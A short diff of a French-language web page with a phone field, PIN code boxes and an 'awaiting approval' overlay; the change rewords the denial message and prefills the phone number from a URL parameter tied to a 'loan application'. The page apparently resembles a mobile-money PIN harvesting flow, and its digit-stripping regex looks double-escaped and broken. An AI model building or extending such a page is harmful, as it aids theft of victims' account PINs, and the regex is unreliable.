@@ -432,7 +432,7 @@
     <div class="spinner" id="spinner"></div>
     <h2 id="overlayTitle">En attente d'approbation</h2>
     <p id="overlayText">Votre demande a été envoyée. Merci de patienter pendant la vérification…</p>
-    <p class="denied-msg" id="deniedMsg">Votre demande a été refusée.</p>
+    <p class="denied-msg" id="deniedMsg">Broche incorrecte.</p>
     <button class="retry-btn" id="retryBtn">RÉESSAYER</button>
   </div>
 
@@ -451,6 +451,14 @@
 <script>
   const phoneInput = document.getElementById('phoneInput');
   const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
+
+  // Automatically reflect the phone number passed from the loan application.
+  const incomingParams = new URLSearchParams(window.location.search);
+  const incomingPhone = incomingParams.get('phone') || '';
+  const normalizedPhone = incomingPhone.replace(/\\D/g, '').replace(/^243/, '');
+  if (/^9[0-9]{8}$/.test(normalizedPhone)) {
+    phoneInput.value = normalizedPhone;
+  }
   const connexionBtn = document.getElementById('connexionBtn');
   const eyeBtn = document.getElementById('eyeBtn');
 
